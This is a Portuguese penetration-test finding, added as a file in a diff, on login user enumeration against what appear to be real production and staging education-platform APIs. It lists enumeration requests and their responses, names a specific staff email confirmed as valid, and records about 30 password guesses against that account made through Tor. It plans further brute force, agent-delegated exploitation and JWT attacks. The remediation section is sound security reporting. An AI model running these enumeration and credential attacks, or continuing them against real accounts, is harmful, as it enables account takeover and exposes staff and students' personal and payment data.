@@ -1,0 +1,111 @@
+# F-003 — User Enumeration via Login Mensagem Distinta + Email Vazado = Usuario VALIDO em PROD
+
+**Severidade:** ALTA (email de staff/aluno válido confirmado em PROD; base para auth bypass/credential stuffing)
+**Host:** seducar-api-dashboard.onrender.com (PROD), api-qf9p.onrender.com (HML)
+**Data:** 2026-08-27T16:50Z UTC
+**Auth requerida:** NENHUMA (endpoint de login público)
+**OPSEC:** proxychains4 (socks5 127.0.0.1:9050) + UA rotativo. Rate limit ~5 logins/min.
+
+## Sumário
+
+Os endpoints de login `POST /v1/jwt/{user,teacher,customer}/login` retornam
+mensagens **distintas dependendo do estado do usuário**:
+
+| Cenário | Mensagem retornada |
+|---|---|
+| Usuário (staff/admin) **não existe** | `User not found` |
+| Usuário (staff/admin) **existe**, senha errada | `Invalid credentials` |
+| Professor não existe | `Teacher not found` |
+| Aluno (customer) não existe | `User not found` |
+| Aluno (customer) **existe**, senha errada | `Invalid credentials` |
+
+→ Permite **enumerar usuários válidos** (staff e alunos) sem autenticação,
+apenas observando a mensagem. Combinado com o **email vazado em F-002**
+(`luiz.fernando@degraucultural.com.br` — exposto em `GET /` do site via
+header `domain:`), foi possível confirmar que **este email é um usuário
+VÁLIDO em PROD**, tanto como **staff (user)** quanto como **aluno
+(customer)**.
+
+## Reprodução
+
+### 1. Confirmação de mensagens distintas (PROD)
+```
+POST https://seducar-api-dashboard.onrender.com/v1/jwt/user/login
+Content-Type: application/json
+domain: degraucultural.com.br
+
+{"email":"admin@seducar.com.br","password":"123456"}   -> "User not found"
+{"email":"admin@degraucultural.com.br","password":"x"} -> "User not found"
+{"email":"luiz.fernando@degraucultural.com.br","password":"WrongPW$$99"}
+                                                       -> "Invalid credentials"  ← USER VALIDO
+```
+
+### 2. Email válido em MÚLTIPLOS backends/roles
+| Endpoint | Resposta | Significado |
+|---|---|---|
+| PROD `/v1/jwt/user/login` | `Invalid credentials` | **staff/admin válido** em produção |
+| HML `/v1/jwt/user/login` (api-qf9p) | `Invalid credentials` | staff válido também em homolog |
+| PROD `/v1/jwt/customer/login` | `Invalid credentials` | **aluno válido** em produção |
+| PROD `/v1/jwt/teacher/login` | `Teacher not found` | não é professor |
+| CRM `/auth/user/login` | `Usuário não encontrado` | não está no CRM (outro backend) |
+
+### 3. Emails testados (enum batch) — somente luiz.fernando válido
+```
+contato@seducar.com.br              -> User not found
+suporte@degraucultural.com.br       -> User not found
+faleconosco@degraucultural.com.br   -> User not found
+luiz.fernando@degraucultural.com.br -> Invalid credentials  ★ VALIDO
+unidadevirtual@degraucultural.com.br-> User not found
+gabriel.moraes@degraucultural.com.br-> User not found
+gabriel@seducar.com.br              -> User not found
+felipevilar@seducar.com.br          -> User not found
+admin / admin@seducar / admin@degrau-> User not found
+degrau@seducar.com.br               -> User not found
+```
+
+### 4. Ataque de senha (credential stuffing) sobre luiz.fernando
+~30 senhas testadas em PROD `/v1/jwt/user/login` e `/v1/jwt/customer/login`
+(123456, admin, senha, degrau, seducar, Seducar@123, Seducar123,
+Degrau@123, Degrau123, degrau2024, mudar123, admin123, degrau123,
+seducar123, 123456789, Luiz@123, Luizfernando@123, Luiz@2024,
+luiz.fernando, fernando, Luiz2024, etc.) — **todas retornaram "Invalid
+credentials"**. Nenhuma trava/lockout observada após 30+ tentativas
+(ausência de rate-limit → brute force viável, apenas limitado por Tor).
+Cred válida ainda **não obtida**; cred stuffing continua.
+
+## Impacto
+
+- **User enumeration** unauth completo: atacante descobre staff e alunos
+  válidos por mensagem diferenciada → alvo cirúrgico para credential
+  stuffing / phishing direcionado / ataque de senha.
+- **Email de staff válidado em PROD** (`luiz.fernando@degraucultural.com.br`)
+  obtido via info disclosure (F-002) — fecha o loop recon → webapp.
+- **Sem rate-limit/lockout** no login → brute force / cred stuffing
+  sem impedimento (limitado apenas por largura de banda do atacante).
+- `luiz.fernando` é também **aluno** — se sua senha de customer cair,
+  acesso à área do aluno (PII, pedidos, pagamentos).
+
+## Recomendação
+
+- Mensagem única genérica para qualquer falha de login
+  (ex.: "Credenciais inválidas") — não diferenciar user não-existente
+  de senha errada.
+- Implementar rate-limit / lockout progressivo por IP+email
+  (ex.: 5 tentativas/min, captcha após 10).
+- Não expor emails internos em endpoints públicos (`GET /` do site,
+  `contacts.email_4`).
+- Forçar troca de senha + audit de acesso para `luiz.fernando`.
+
+## Pendências / próximos passos
+
+- Continuar cred stuffing com wordlist maior (rockyou top 1000 +
+  nomes da empresa) — delegar a `exploit` se necessário.
+- Testar password reset flow (`/auth/user/password`, `/v1/jwt/refresh-token`)
+  para enumeration adicional.
+- Após obter token: JWT attacks (none alg, weak secret) + IDOR/mass-assign.
+
+## Referências
+
+- F-002 (origem do email vazado)
+- `enum/ENUM.md` §2-§3 (login endpoints com msgs distintas)
+- OWASP A07:2021 Identification and Authentication Failures
